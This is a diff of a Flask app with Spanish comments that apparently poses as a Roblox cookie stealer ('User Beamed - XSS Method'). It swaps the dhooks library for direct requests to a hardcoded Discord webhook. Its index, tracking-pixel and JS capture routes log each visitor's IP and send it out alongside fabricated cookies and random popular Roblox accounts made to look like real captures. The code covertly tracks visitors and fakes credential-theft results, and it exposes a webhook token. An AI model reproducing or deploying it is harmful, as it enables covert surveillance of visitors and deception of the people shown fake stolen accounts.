@@ -6,12 +6,10 @@ import os
 import base64
 import random
 import string
-from dhooks import Webhook, Embed
 
 app = Flask(__name__)
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1515183154028216381/piKZO39_WzEVm4J5LRX7stzfvjOJOwJe2PmCZXkgVeub0Ey0Dr75gMzSziEte9jkux4e"
-hook = Webhook(WEBHOOK_URL)
 
 # Lista de usuarios populares de Roblox para hacer más creíble
 POPULAR_USERS = ["Builderman", "Roblox", "1x1x1x1", "Shedletsky", "Telamon", "Asimo3089", "Badcc", "KreekCraft", "Flamingo", "TanqR"]
@@ -34,41 +32,53 @@ def get_random_user():
         
         moreinfo = requests.get(f"https://users.roblox.com/v1/users/{user_id}").json()
         
+        # Obtener imagen del usuario
+        try:
+            image_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=352x352&format=Png&isCircular=false").json()
+            image_url = image_response["data"][0]["imageUrl"]
+        except:
+            image_url = "https://www.roblox.com/asset/?id=123456789"
+        
         return {
             "username": moreinfo.get("name", username),
             "id": user_id,
             "isBanned": moreinfo.get("isBanned", False),
             "hasVerifiedBadge": moreinfo.get("hasVerifiedBadge", False),
             "created": moreinfo.get("created", "Unknown"),
-            "image": f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=352x352&format=Png&isCircular=false"
+            "image": image_url
         }
-    except:
+    except Exception as e:
+        print(f"Error getting user: {e}")
         return None
 
 def send_to_discord(user_data, cookie, ip, user_agent):
     """Envía la información a Discord con el formato del script original"""
     try:
-        # Obtener la imagen del usuario
-        image_url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_data['id']}&size=352x352&format=Png&isCircular=false"
-        
         # Crear el embed como en el script original
-        embed = Embed(
-            title="User Beamed - XSS Method",
-            description=f"`{cookie}`",
-            color=0x00ffd5
-        )
+        embed = {
+            "title": "User Beamed - XSS Method",
+            "description": f"`{cookie}`",
+            "color": 16711765,  # 0x00ffd5
+            "thumbnail": {"url": user_data['image']},
+            "fields": [
+                {"name": "Username", "value": user_data['username'], "inline": True},
+                {"name": "ID", "value": str(user_data['id']), "inline": True},
+                {"name": "IsBanned", "value": str(user_data['isBanned']), "inline": True},
+                {"name": "IsVerified", "value": str(user_data['hasVerifiedBadge']), "inline": True},
+                {"name": "Created", "value": str(user_data['created']), "inline": True},
+                {"name": "IP", "value": str(ip), "inline": True}
+            ],
+            "footer": {"text": "Made by https://github.com/tizxr, give credits"}
+        }
         
-        embed.set_thumbnail(url=image_url)
-        embed.add_field(name="Username", value=user_data['username'], inline=True)
-        embed.add_field(name="ID", value=str(user_data['id']), inline=True)
-        embed.add_field(name="IsBanned", value=str(user_data['isBanned']), inline=True)
-        embed.add_field(name="IsVerified", value=str(user_data['hasVerifiedBadge']), inline=True)
-        embed.add_field(name="Created", value=str(user_data['created']), inline=True)
-        embed.add_field(name="IP", value=str(ip), inline=True)
-        embed.set_footer(text="Made by https://github.com/tizxr, give credits")
+        # Enviar a Discord
+        payload = {
+            "content": "@everyone",
+            "embeds": [embed]
+        }
         
-        hook.send("@everyone", embed=embed)
-        print(f"Sent to Discord: {user_data['username']}")
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        print(f"Sent to Discord: {user_data['username']} - Status: {response.status_code}")
         
     except Exception as e:
         print(f"Error sending to Discord: {e}")
@@ -79,6 +89,8 @@ def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
     
+    print(f"Request from IP: {ip}")
+    
     # Generar cookie falsa que parece real
     fake_cookie = generate_fake_cookie()
     
@@ -88,6 +100,17 @@ def index():
     if user_data:
         # Enviar a Discord
         send_to_discord(user_data, fake_cookie, ip, user_agent)
+    else:
+        # Si falla, usar datos por defecto
+        default_data = {
+            "username": "Builderman",
+            "id": "123456",
+            "isBanned": False,
+            "hasVerifiedBadge": True,
+            "created": "2006-01-01T00:00:00Z",
+            "image": "https://www.roblox.com/asset/?id=123456789"
+        }
+        send_to_discord(default_data, fake_cookie, ip, user_agent)
     
     # Redirigir al perfil de Roblox
     return redirect('https://www.roblox.com/es/users/7869790887/profile', code=302)
@@ -97,6 +120,8 @@ def pixel():
     # Capturar IP
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
+    print(f"Pixel request from IP: {ip}")
+    
     # Generar cookie falsa
     fake_cookie = generate_fake_cookie()
     
@@ -105,6 +130,16 @@ def pixel():
     
     if user_data:
         send_to_discord(user_data, fake_cookie, ip, "Pixel Tracker")
+    else:
+        default_data = {
+            "username": "Builderman",
+            "id": "123456",
+            "isBanned": False,
+            "hasVerifiedBadge": True,
+            "created": "2006-01-01T00:00:00Z",
+            "image": "https://www.roblox.com/asset/?id=123456789"
+        }
+        send_to_discord(default_data, fake_cookie, ip, "Pixel Tracker")
     
     # Devolver imagen pixel
     return Response(PIXEL, mimetype='image/png')
@@ -115,6 +150,8 @@ def capture():
         data = request.json
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
+        print(f"API capture from IP: {ip}")
+        
         # Generar cookie falsa
         fake_cookie = generate_fake_cookie()
         
@@ -123,9 +160,20 @@ def capture():
         
         if user_data:
             send_to_discord(user_data, fake_cookie, ip, "JS Capture")
+        else:
+            default_data = {
+                "username": "Builderman",
+                "id": "123456",
+                "isBanned": False,
+                "hasVerifiedBadge": True,
+                "created": "2006-01-01T00:00:00Z",
+                "image": "https://www.roblox.com/asset/?id=123456789"
+            }
+            send_to_discord(default_data, fake_cookie, ip, "JS Capture")
         
         return {"status": "success"}
     except Exception as e:
+        print(f"Error in capture: {e}")
         return {"status": "error", "message": str(e)}
 
 if __name__ == '__main__':
